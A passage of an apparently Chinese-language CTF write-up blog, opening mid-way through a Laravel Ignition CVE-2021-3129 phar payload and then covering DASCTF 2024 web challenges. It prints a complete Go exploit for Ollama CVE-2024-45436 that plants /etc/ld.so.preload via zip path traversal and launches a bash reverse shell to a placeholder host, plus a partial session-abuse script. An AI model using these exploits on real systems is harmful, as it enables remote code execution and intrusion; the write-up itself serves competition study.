class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">34</span>=<span class="hljs-number">00</span>=<span class="hljs-number">76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">77</span>=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">66</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">66</span>=<span class="hljs-number">00</span>=<span class="hljs-number">53</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">34</span>=<span class="hljs-number">00</span>=<span class="hljs-number">73</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">65</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>a<span class="hljs-string">&quot;</span><span class="hljs-string">  &#125;</span><span class="hljs-string">&#125;</span><span class="hljs-string">解码</span><span class="hljs-string">&#123;</span><span class="hljs-string">  &quot;</span>solution<span class="hljs-string">&quot;: &quot;</span>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution<span class="hljs-string">&quot;,</span><span class="hljs-string">  &quot;</span>parameters<span class="hljs-string">&quot;: &#123;</span><span class="hljs-string">    &quot;</span>variableName<span class="hljs-string">&quot;: &quot;</span>username<span class="hljs-string">&quot;,</span><span class="hljs-string">    &quot;</span>viewFile<span class="hljs-string">&quot;: &quot;</span>php<span class="hljs-punctuation">:</span><span class="hljs-comment">//filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span>跑，注意路径是/src，不是/var/www<span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;phar:///src/storage/logs/laravel.log/test.txt&quot;</span>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/17312640562917.png" alt="img"></p><p>我找了个一把梭的脚本，但是那个脚本是有问题的（吓得我当时还以为不是这个漏洞）</p><p>后来找到个新的一把梭脚本，直接猛打（不过都是lolita大佬手打完之后了）</p><p><a href="https://github.com/joshuavanderpoll/CVE-2021-3129">https://github.com/joshuavanderpoll/CVE-2021-3129</a></p><p>按照参考文章手打复现的话要注意，<code>最后绝对路径是/src，不是/var/www</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF-2024金秋十月</title>
    <link href="/2024/10/24/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/"/>
    <url>/2024/10/24/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTF-2024金秋十月-秋意浓-战火燃-码上见真章"><a href="#DASCTF-2024金秋十月-秋意浓-战火燃-码上见真章" class="headerlink" title="DASCTF 2024金秋十月| 秋意浓 战火燃 码上见真章"></a>DASCTF 2024金秋十月| 秋意浓 战火燃 码上见真章</h1><p>没打，web三道0解题，赛后随便看看wp，看看思路</p><h2 id="flow"><a href="#flow" class="headerlink" title="flow"></a>flow</h2><p>任意文件读取</p><p>直接<code>/proc/1/environ</code></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024011516451.png" alt="image-20241024011516451"></p><h2 id="ollama4shell"><a href="#ollama4shell" class="headerlink" title="ollama4shell"></a>ollama4shell</h2><p>提示：CVE-2024-45436     LD_PRELOAD</p><h3 id="CVE-2024-45436"><a href="#CVE-2024-45436" class="headerlink" title="CVE-2024-45436"></a>CVE-2024-45436</h3><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024011722750.png" alt="image-20241024011722750"></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024011851157.png" alt="image-20241024011851157"></p><p>看了下描述以及代码比较，大概就是像zipslip一样的漏洞</p><p>让文件的名字为<code>../../xx</code>就能够任意穿越目录</p><div class="code-wrapper"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenEvilZip</span><span class="hljs-params">()</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;    zipFile, err := os.Create(<span class="hljs-string">&quot;evil.zip&quot;</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    zw := zip.NewWriter(zipFile)    preloadFile, err := zw.Create(<span class="hljs-string">&quot;../../../../../../../../../../etc/ld.so.preload&quot;</span>)    _, err = preloadFile.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;/tmp/hook.so&quot;</span>))    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    soFile, err := zw.Create(<span class="hljs-string">&quot;../../../../../../../../../../tmp/hook.so&quot;</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    locSoFile, err := os.Open(<span class="hljs-string">&quot;hook.so&quot;</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    <span class="hljs-keyword">defer</span> locSoFile.Close()    io.Copy(soFile, locSoFile)    zw.Close()    zipFile.Close()    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;evil.zip&quot;</span>, <span class="hljs-literal">nil</span>&#125;</code></pre></div><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>我们常知的LD_PRELOAD是一个环境变量</p><p>但是他也存在一个对应的文件是在<code>/etc/ld.so.preload</code>，内容为指定的so文件路径(例如<code>/tmp/xx.so</code>)</p><h3 id="官方payload"><a href="#官方payload" class="headerlink" title="官方payload"></a>官方payload</h3><p>知道以上这两点大概就可以了，其他一些细节就不看了</p><div class="code-wrapper"><pre><code class="hljs awk">需要在linux下运行，环境需要有gcc安装golang，执行如下命令反弹shellgo run main.go -target http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">11434</span><span class="hljs-regexp">/ -exec &quot;bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span>xxx.xxx.xxx.xxx/xxxx <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><span class="hljs-string">&quot;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (    <span class="hljs-string">&quot;archive/zip&quot;</span>    <span class="hljs-string">&quot;bufio&quot;</span>    <span class="hljs-string">&quot;bytes&quot;</span>    <span class="hljs-string">&quot;crypto/sha256&quot;</span>    <span class="hljs-string">&quot;encoding/json&quot;</span>    <span class="hljs-string">&quot;flag&quot;</span>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;io&quot;</span>    <span class="hljs-string">&quot;log&quot;</span>    <span class="hljs-string">&quot;net/http&quot;</span>    <span class="hljs-string">&quot;net/url&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;os/exec&quot;</span>    <span class="hljs-string">&quot;strconv&quot;</span>    <span class="hljs-string">&quot;strings&quot;</span>)<span class="hljs-keyword">const</span> CODE = <span class="hljs-string">`#include &lt;stdio.h&gt;</span><span class="hljs-string">#include &lt;stdlib.h&gt;</span><span class="hljs-string">#include &lt;unistd.h&gt;</span><span class="hljs-string"></span><span class="hljs-string">void __attribute__((constructor)) myInitFunction() &#123;</span><span class="hljs-string">    const char *f1 = &quot;/etc/ld.so.preload&quot;;</span><span class="hljs-string">    const char *f2 = &quot;/tmp/hook.so&quot;;</span><span class="hljs-string">    unlink(f1);</span><span class="hljs-string">    unlink(f2);</span><span class="hljs-string">    system(&quot;bash -c &#x27;%s&#x27;&quot;);</span><span class="hljs-string">&#125;`</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;    <span class="hljs-keyword">var</span> targetUrl <span class="hljs-type">string</span>    <span class="hljs-keyword">var</span> execCmd <span class="hljs-type">string</span>    flag.StringVar(&amp;targetUrl, <span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;target url&quot;</span>)    flag.StringVar(&amp;execCmd, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;exec command&quot;</span>)    flag.Parse()    <span class="hljs-keyword">if</span> targetUrl == <span class="hljs-string">&quot;&quot;</span> &#123;        fmt.Println(<span class="hljs-string">&quot;target url is required&quot;</span>)        os.Exit(<span class="hljs-number">1</span>)    &#125;    u := FormatUrl(targetUrl)    detectRes, err := Detect(u)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        log.Fatal(err)    &#125;    <span class="hljs-keyword">if</span> !detectRes &#123;        fmt.Println(<span class="hljs-string">&quot;\nVulnerability does not exist&quot;</span>)        os.Exit(<span class="hljs-number">1</span>)    &#125;    fmt.Println(<span class="hljs-string">&quot;\nVulnerability does exist!!!&quot;</span>)    <span class="hljs-keyword">if</span> execCmd == <span class="hljs-string">&quot;&quot;</span> &#123;        fmt.Println(<span class="hljs-string">&quot;exec command is required&quot;</span>)        os.Exit(<span class="hljs-number">1</span>)    &#125;    _, err = GenEvilSo(execCmd)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        log.Fatal(err)    &#125;    evilZipName, err := GenEvilZip()    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        log.Fatal(err)    &#125;    blobSha256Name, err := UploadBlob(u, evilZipName)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        log.Fatal(err)    &#125;    err = Create(u, strings.ReplaceAll(blobSha256Name, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>))    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        log.Fatal(err)    &#125;    err = EmbeddingsExec(u, <span class="hljs-string">&quot;all-minilm:22m&quot;</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        log.Fatal(err)    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenEvilSo</span><span class="hljs-params">(cmd <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;    code := fmt.Sprintf(CODE, cmd)    err := os.WriteFile(<span class="hljs-string">&quot;tmp.c&quot;</span>, []<span class="hljs-type">byte</span>(code), <span class="hljs-number">0644</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    compile := exec.Command(<span class="hljs-string">&quot;gcc&quot;</span>, <span class="hljs-string">&quot;tmp.c&quot;</span>, <span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;hook.so&quot;</span>, <span class="hljs-string">&quot;-fPIC&quot;</span>, <span class="hljs-string">&quot;-shared&quot;</span>, <span class="hljs-string">&quot;-ldl&quot;</span>, <span class="hljs-string">&quot;-D_GNU_SOURCE&quot;</span>)    err = compile.Run()    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        fmt.Println(err)        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hook.so&quot;</span>, <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenEvilZip</span><span class="hljs-params">()</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;    zipFile, err := os.Create(<span class="hljs-string">&quot;evil.zip&quot;</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    zw := zip.NewWriter(zipFile)    preloadFile, err := zw.Create(<span class="hljs-string">&quot;../../../../../../../../../../etc/ld.so.preload&quot;</span>)    _, err = preloadFile.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;/tmp/hook.so&quot;</span>))    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    soFile, err := zw.Create(<span class="hljs-string">&quot;../../../../../../../../../../tmp/hook.so&quot;</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    locSoFile, err := os.Open(<span class="hljs-string">&quot;hook.so&quot;</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    <span class="hljs-keyword">defer</span> locSoFile.Close()    io.Copy(soFile, locSoFile)    zw.Close()    zipFile.Close()    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;evil.zip&quot;</span>, <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UploadBlob</span><span class="hljs-params">(url, fileName <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;    f, err := os.Open(fileName)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    <span class="hljs-keyword">defer</span> f.Close()    h := sha256.New()    <span class="hljs-keyword">if</span> _, err := io.Copy(h, f); err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    fName := fmt.Sprintf(<span class="hljs-string">&quot;sha256:%x&quot;</span>, h.Sum(<span class="hljs-literal">nil</span>))    _, err = f.Seek(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    newReader := bufio.NewReader(f)    res, err := http.Post(url+<span class="hljs-string">&quot;/api/blobs/&quot;</span>+fName, <span class="hljs-string">&quot;application/octet-stream&quot;</span>, newReader)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    content, err := io.ReadAll(res.Body)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err    &#125;    fmt.Println(<span class="hljs-string">&quot;http log: &quot;</span> + <span class="hljs-type">string</span>(content))    <span class="hljs-keyword">return</span> fName, <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Create</span><span class="hljs-params">(url, remoteFilePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;    jsonContent := []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">`&#123;&quot;name&quot;: &quot;test&quot;,&quot;modelfile&quot;: &quot;FROM /root/.ollama/models/blobs/%s&quot;&#125;`</span>, remoteFilePath))    res, err := http.Post(url+<span class="hljs-string">&quot;/api/create&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>, bytes.NewBuffer(jsonContent))    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> err    &#125;    content, err := io.ReadAll(res.Body)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> err    &#125;    fmt.Println(<span class="hljs-string">&quot;http log: &quot;</span> + <span class="hljs-type">string</span>(content))    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">EmbeddingsExec</span><span class="hljs-params">(url, model <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ &#123;        jsonContent := []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">`&#123;&quot;model&quot;:&quot;%s&quot;,&quot;keep_alive&quot;: 0&#125;`</span>, model))        res, err := http.Post(url+<span class="hljs-string">&quot;/api/embeddings&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>, bytes.NewBuffer(jsonContent))        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;            <span class="hljs-keyword">return</span> err        &#125;        <span class="hljs-keyword">if</span> res.StatusCode != <span class="hljs-number">200</span> &#123;            fmt.Println(<span class="hljs-string">&quot;pulling model, please wait......&quot;</span>)            err := PullMinilmModel(url)            <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;                <span class="hljs-keyword">return</span> err            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            content, err := io.ReadAll(res.Body)            <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;                <span class="hljs-keyword">return</span> err            &#125;            fmt.Println(<span class="hljs-string">&quot;http log: &quot;</span> + <span class="hljs-type">string</span>(content))            <span class="hljs-keyword">break</span>        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PullMinilmModel</span><span class="hljs-params">(url <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;    jsonContent := <span class="hljs-string">`&#123;&quot;name&quot;:&quot;all-minilm:22m&quot;&#125;`</span>    res, err := http.Post(url+<span class="hljs-string">&quot;/api/pull&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>, bytes.NewBuffer([]<span class="hljs-type">byte</span>(jsonContent)))    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> err    &#125;    content, err := io.ReadAll(res.Body)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> err    &#125;    fmt.Println(<span class="hljs-string">&quot;http log: &quot;</span> + <span class="hljs-type">string</span>(content))    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Detect</span><span class="hljs-params">(url <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">bool</span>, <span class="hljs-type">error</span>) &#123;    res, err := http.Get(url + <span class="hljs-string">&quot;/api/version&quot;</span>)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err    &#125;    <span class="hljs-keyword">var</span> jsonMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>    jsonContent, err := io.ReadAll(res.Body)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err    &#125;    <span class="hljs-keyword">if</span> err := json.Unmarshal(jsonContent, &amp;jsonMap); err != <span class="hljs-literal">nil</span> || jsonMap[<span class="hljs-string">&quot;version&quot;</span>] == <span class="hljs-string">&quot;&quot;</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err    &#125;    <span class="hljs-keyword">return</span> isVersionLessThan(jsonMap[<span class="hljs-string">&quot;version&quot;</span>], <span class="hljs-string">&quot;0.1.47&quot;</span>), <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FormatUrl</span><span class="hljs-params">(u <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;    ur, err := url.Parse(u)    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        fmt.Println(ur)    &#125;    <span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;%s://%s&quot;</span>, ur.Scheme, ur.Host)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isVersionLessThan</span><span class="hljs-params">(version, target <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;    v1 := strings.Split(version, <span class="hljs-string">&quot;.&quot;</span>)    v2 := strings.Split(target, <span class="hljs-string">&quot;.&quot;</span>)    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(v1) &amp;&amp; i &lt; <span class="hljs-built_in">len</span>(v2); i++ &#123;        num1, _ := strconv.Atoi(v1[i])        num2, _ := strconv.Atoi(v2[i])        <span class="hljs-keyword">if</span> num1 &lt; num2 &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> num1 &gt; num2 &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(v1) &lt; <span class="hljs-built_in">len</span>(v2)&#125;</code></pre></div><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>大概功能就是根据username，创建username.xml文件</p><p>漏洞点</p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024015831014.png" alt="image-20241024015831014"></p><p><img src="/../images/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/image-20241024015908196.png" alt="image-20241024015908196"></p><p>注册的username和password都会被存储在session中</p><p>然后在<code>/editPass</code>会从session中获取password，然后替换所有匹配的旧密码为新密码</p><p>总之关键就在这个session中，也就是网页中的<code>JSESSIONID</code></p><p>看了payload大概就懂了</p><p>不同的session就对应着不同的旧密码（也就是想要被替换的内容）</p><p>那我们收集不同的session（这些session的username是相同的，因为最后是要对同一个文件进行替换）</p><p>在<code>/editPass</code>路由使用不同的<code>JSESSIONID</code>就可以替换不同的旧密码</p><div class="code-wrapper"><pre><code class="hljs python">sessions = &#123;&#125;<span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">passwd</span>):    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>&#125;    res = requests.post(targeturl+<span class="hljs-string">&quot;/register&quot;</span>,data=data)    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)    <span class="hljs-keyword">else</span> : <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register fail: <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">getsession</span>(<span class="hljs-params">passwd</span>):    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>&#125;    res = requests.post(targeturl+<span class="hljs-string">&quot;/login&quot;</span>,data=data)    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-keyword">in</span> res.text.lower() :        session=res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>).split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;session for <span class="hljs-subst">&#123;passwd&#125;</span> : <span class="hljs-subst">&#123;session&#125;</span>&quot;</span>)        headers = &#123;<span class="hljs-string">&quot;Cookie&quot;</span> : <span class="hljs-string">f&quot;JSESSIONID=<span class="hljs-subst">&#123;session&#125;</span>&quot;</span>&#125;        sessions[passwd] = headers    <span class="hljs-keyword">else</span>:        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;login fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">editpass</span>(<span class="hljs-params">oldpass,newpass</span>):    data=&#123;<span class="hljs-string">&quot;newPass&quot;</span>:newpass&#125;    